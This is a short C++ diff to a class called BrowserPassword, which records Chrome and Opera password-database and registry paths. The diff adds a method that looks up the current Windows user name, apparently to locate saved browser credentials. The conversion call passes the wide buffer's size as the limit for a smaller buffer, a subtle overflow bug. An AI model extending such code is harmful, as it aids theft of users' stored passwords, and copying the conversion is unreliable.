@@ -8,10 +8,22 @@ BrowserPassword::BrowserPassword()
 	_mapRegKeyPath.insert(std::pair<BrowserType, const wchar_t*>(BrowserType::OPERA, _OPERA_REGKEY_PATH));
 	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::CHROME, _CHROME_DATABASE_PATH));
 	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::OPERA, _OPERA_DATABASE_PATH));
+	findCurrentUserName();
 }
 
 BrowserPassword::~BrowserPassword()
 {
+}
+
+void					BrowserPassword::findCurrentUserName()
+{
+	DWORD				len = UNLEN + 1;
+	wchar_t				usernameUnicode[UNLEN + 1] = { 0 };
+	char				usernameUtf[UNLEN + 1] = { 0 };
+
+	GetUserName(usernameUnicode, &len);
+	std::wcstombs(usernameUtf, usernameUnicode, sizeof(usernameUnicode));
+	_userName.append(usernameUtf);
 }
 
 void					BrowserPassword::setBrowserType(const BrowserType &type)
